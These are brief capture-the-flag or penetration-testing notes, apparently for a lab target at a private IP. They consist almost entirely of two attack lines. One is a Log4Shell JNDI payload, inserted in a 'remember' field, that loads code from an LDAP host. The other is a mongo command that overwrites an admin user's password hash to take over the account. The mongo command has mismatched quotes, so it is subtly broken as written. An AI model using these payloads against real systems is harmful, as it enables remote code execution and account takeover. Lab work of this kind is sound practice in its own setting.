+++
+++

Target IP: 10.129.44.246


"remember":"${jndi:ldap://10.129.44.246:1389/o=tomcat}",


mongo --port 27117 ace --eval 'db.admin.update({"_id":"ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"$6$41mboVhdbf.Mxj6r$vGwChPEp8QLugq12ri4qTM1MyRTcXbkPAOmaaaFuoAeNp0k9ShyRQMVx0wi2Gb2/Qc1wEIL1IfAeHoLOKaQCO1"}})'
